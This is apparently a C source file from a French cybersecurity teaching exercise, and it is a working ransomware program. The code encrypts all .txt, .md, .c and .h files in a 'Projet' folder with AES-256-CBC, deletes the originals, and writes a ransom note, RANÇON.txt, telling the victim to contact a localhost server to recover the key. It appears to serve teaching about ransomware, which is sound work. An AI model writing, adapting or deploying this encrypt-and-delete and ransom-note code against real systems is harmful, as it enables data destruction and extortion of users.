#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#define BUF_SIZE 4096
#define PROJET_PATH "Projet"
#define CLE_FILE "cle.key"
#define IV_FILE "cle.iv"
#define RANCON_FILE "Projet/RANÇON.txt"

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

void charger_cle_iv(unsigned char *key, unsigned char *iv) {
    FILE *k = fopen(CLE_FILE, "rb");
    if (!k) {
        perror("Erreur ouverture cle.key");
        exit(EXIT_FAILURE);
    }

    FILE *v = fopen(IV_FILE, "rb");
    if (!v) {
        fclose(k);
        perror("Erreur ouverture cle.iv");
        exit(EXIT_FAILURE);
    }

    if (fread(key, 1, 32, k) != 32) {
        fclose(k);
        fclose(v);
        fprintf(stderr, "Erreur : cle.key doit contenir 32 octets\n");
        exit(EXIT_FAILURE);
    }

    if (fread(iv, 1, 16, v) != 16) {
        fclose(k);
        fclose(v);
        fprintf(stderr, "Erreur : cle.iv doit contenir 16 octets\n");
        exit(EXIT_FAILURE);
    }

    fclose(k);
    fclose(v);
}

int extension_valide(const char *nom) {
    return strstr(nom, ".txt") || strstr(nom, ".md") || strstr(nom, ".c") || strstr(nom, ".h");
}

void chiffrer_fichier(const char *in_path, const char *out_path, unsigned char *key, unsigned char *iv) {
    FILE *in = fopen(in_path, "rb");
    FILE *out = fopen(out_path, "wb");
    if (!in || !out) {
        perror("Erreur ouverture fichier");
        if (in) fclose(in);
        if (out) fclose(out);
        return;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    unsigned char inbuf[BUF_SIZE];
    unsigned char outbuf[BUF_SIZE + EVP_MAX_BLOCK_LENGTH];
    int inlen, outlen;

    while ((inlen = fread(inbuf, 1, BUF_SIZE, in)) > 0) {
        EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen);
        fwrite(outbuf, 1, outlen, out);
    }

    EVP_EncryptFinal_ex(ctx, outbuf, &outlen);
    fwrite(outbuf, 1, outlen, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);
    remove(in_path);
}

void parcourir_et_chiffrer(const char *dir_path, unsigned char *key, unsigned char *iv) {
    DIR *dir = opendir(dir_path);
    if (!dir) {
        perror("Erreur ouverture dossier Projet");
        exit(EXIT_FAILURE);
    }

    struct dirent *entry;
    char in_path[512], out_path[512];

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG && extension_valide(entry->d_name)) {
            snprintf(in_path, sizeof(in_path), "%s/%s", dir_path, entry->d_name);
            snprintf(out_path, sizeof(out_path), "%s/%s.enc", dir_path, entry->d_name);
            printf("Chiffrement : %s\n", entry->d_name);
            chiffrer_fichier(in_path, out_path, key, iv);
        }
    }

    closedir(dir);
}

void generer_rancon() {
    FILE *f = fopen(RANCON_FILE, "w");
    if (!f) {
        perror("Erreur création rançon");
        return;
    }

    fprintf(f,
        "#########################################\n"
        "#        FICHIERS CHIFFRÉS              #\n"
        "#########################################\n\n"
        "Vos fichiers dans ce dossier ont été chiffrés par ProManager,\n"
        "car la date limite de remise du projet a été dépassée.\n\n"
        "Chaque fichier a été chiffré en AES-256 avec une clé unique.\n\n"
        "Ne tentez pas de modifier les fichiers `.enc`, vous risqueriez\n"
        "de les rendre irrécupérables.\n\n"
        "-----------------------------------------\n\n"
        "Pour récupérer vos fichiers :\n\n"
        "1. Lancez le programme `client_decrypt` dans TP/.\n"
        "2. Connectez-vous au serveur à 127.0.0.1:4242\n"
        "3. Envoyez une justification d'au moins 20 caractères.\n\n"
        "Si vos excuses sont acceptées, vous recevrez :\n"
        "- La clé de déchiffrement\n"
        "- Le vecteur IV\n\n"
        "Fichiers concernés : *.txt, *.md, *.c, *.h\n\n"
        "-----------------------------------------\n"
        "TP cybersécurité - ProManager\n"
    );

    fclose(f);
}

int main() {
    unsigned char key[32], iv[16];
    charger_cle_iv(key, iv);
    parcourir_et_chiffrer(PROJET_PATH, key, iv);
    generer_rancon();
    printf("Fichiers chiffrés avec succès. RANÇON.txt généré.\n");
    return 0;
}
